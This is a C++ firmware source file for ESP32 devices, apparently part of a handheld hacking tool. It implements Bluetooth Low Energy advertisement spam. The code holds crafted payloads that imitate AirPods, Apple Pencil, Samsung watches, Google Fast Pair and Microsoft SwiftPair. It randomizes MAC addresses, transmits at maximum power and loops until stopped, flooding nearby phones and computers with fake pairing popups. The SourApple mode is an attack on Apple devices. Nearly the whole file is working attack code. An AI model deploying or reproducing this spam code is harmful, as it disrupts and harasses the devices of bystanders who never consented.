#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include <globals.h>

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

BLEAdvertising *pAdvertising;

enum EBLEPayloadType { 
    Microsoft = 0, 
    SourApple = 1, 
    AppleJuice = 2, 
    Samsung = 3, 
    Google = 4,
    Apple_Fixed = 5,
    AirPods_Pro_2 = 6
};

struct DeviceType { uint32_t value; };
struct WatchModel { uint8_t value; };

const DeviceType android_models[] = {
    {0xCD8256}, {0x92BBBD}, {0x821F66}, {0xD446A7}, {0x2D7A23}, {0x0E30C3},
    {0xD99CA1}, {0xB37A62}, {0x14015F}, {0x02110D}, {0x3C109B}, {0x0974E1}
};

const WatchModel watch_models[] = {
    {0x11}, {0x12}, {0x13}, {0x15}, {0x16}, {0x1B}, {0x1C}, {0x1D}
};

static uint8_t apple_device_id[3] = {0x12, 0x34, 0x56};
static bool apple_signatures_initialized = false;

void generateRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
        if (i == 0) mac[i] = (mac[i] | 0xF0) & 0xFE; 
    }
}

void initializeAppleSignatures() {
    if (!apple_signatures_initialized) {
        esp_fill_random(apple_device_id, 3);
        apple_signatures_initialized = true;
    }
}

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t packet[31];
    int packet_len = 0;

    switch (Type) {
        case Microsoft: {
            const uint8_t swiftpair[] = {
                0x02, 0x01, 0x06, 0x03, 0x03, 0x06, 0xFE, 0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80
            };
            memcpy(packet, swiftpair, sizeof(swiftpair));
            packet_len = sizeof(swiftpair);
            break;
        }
        case AppleJuice: {
            initializeAppleSignatures();
            const uint8_t airpods[] = {
                0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                apple_device_id[0], apple_device_id[1], apple_device_id[2], 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            memcpy(packet, airpods, sizeof(airpods));
            packet_len = sizeof(airpods);
            break;
        }
        case Samsung: {
            uint8_t samsung[] = {
                0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 
                watch_models[random(0,6)].value
            };
            memcpy(packet, samsung, sizeof(samsung));
            packet_len = sizeof(samsung);
            break;
        }
        case Google: {
            uint32_t model = android_models[random(0, 12)].value;
            uint8_t google[] = {
                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 16) & 0xFF), (uint8_t)((model >> 8) & 0xFF), (uint8_t)(model & 0xFF)
            };
            memcpy(packet, google, sizeof(google));
            packet_len = sizeof(google);
            break;
        }
        case SourApple: {
            uint8_t sour[] = {
                0x10, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01, apple_device_id[0], 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
            };
            memcpy(packet, sour, sizeof(sour));
            packet_len = sizeof(sour);
            break;
        }
        case Apple_Fixed: {
            const uint8_t apple_pencil[] = {
                0x16, 0xff, 0x4c, 0x00, 0x0c, 0x0e, 0x0a, 0x0f, 0x01, 0x02, 0x03, 0x0d, 0x00, 0x00, 0x00, 0x10, 0x02, 0x01, 0x1a, 0x03, 0x03, 0x6f, 0xfe
            };
            memcpy(packet, apple_pencil, sizeof(apple_pencil));
            packet_len = sizeof(apple_pencil);
            break;
        }
        case AirPods_Pro_2: {
            const uint8_t airpods_pro_2[] = {
                0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x0d, 0x05, 0x0c, 0x93, 0x32, 0x01, 0xcb, 0x01, 0x02, 0x03, 0x8f, 0x64, 0xc4, 0x78, 0x25, 0x10, 0x02, 0x00, 0x00, 0x00
            };
            memcpy(packet, airpods_pro_2, sizeof(airpods_pro_2));
            packet_len = sizeof(airpods_pro_2);
            break;
        }
    }

    if (packet_len > 0) {
#ifdef NIMBLE_V2_PLUS
        AdvData.addData(packet, packet_len);
#else
        AdvData.addData(std::string((char *)packet, packet_len));
#endif
    }
    return AdvData;
}

void executeSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);

    BLEDevice::init("Device");
    vTaskDelay(20 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    advertisementData.setFlags(0x06); // General Discoverable

    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setMinInterval(0x20); // 20ms
    pAdvertising->setMaxInterval(0x20);

    pAdvertising->start();
    
    // Use longer window for Android/Samsung to allow scanner to lock on
    if (type == Samsung || type == Google) vTaskDelay(1200 / portTICK_PERIOD_MS);
    else vTaskDelay(300 / portTICK_PERIOD_MS);

    pAdvertising->stop();
    vTaskDelay(30 / portTICK_PERIOD_MS);
    BLEDevice::deinit();
    vTaskDelay(30 / portTICK_PERIOD_MS);
}

void aj_adv(int ble_choice) {
    int mael = 0;
    int count = 0;
    while (1) {
        switch (ble_choice) {
            case 0: displayTextLine("AppleJuice (" + String(count) + ")"); executeSpam(AppleJuice); break;
            case 1: displayTextLine("SourApple (" + String(count) + ")"); executeSpam(SourApple); break;
            case 2: displayTextLine("SwiftPair (" + String(count) + ")"); executeSpam(Microsoft); break;
            case 3: displayTextLine("Samsung (" + String(count) + ")"); executeSpam(Samsung); break;
            case 4: displayTextLine("Android (" + String(count) + ")"); executeSpam(Google); break;
            case 5:
                displayTextLine("Spam All (" + String(count) + ")");
                switch(mael % 5) {
                    case 0: executeSpam(Samsung); break;
                    case 1: executeSpam(Google); break;
                    case 2: executeSpam(AppleJuice); break;
                    case 3: executeSpam(Microsoft); break;
                    case 4: executeSpam(AirPods_Pro_2); break;
                }
                mael++;
                break;
            case 7: displayTextLine("Apple Fixed (" + String(count) + ")"); executeSpam(Apple_Fixed); break;
            case 8: displayTextLine("AirPods Pro 2 (" + String(count) + ")"); executeSpam(AirPods_Pro_2); break;
        }
        count++;
        vTaskDelay(100 / portTICK_PERIOD_MS);
        if (check(EscPress)) {
            returnToMenu = true;
            break;
        }
    }
    BLEDevice::deinit();
}
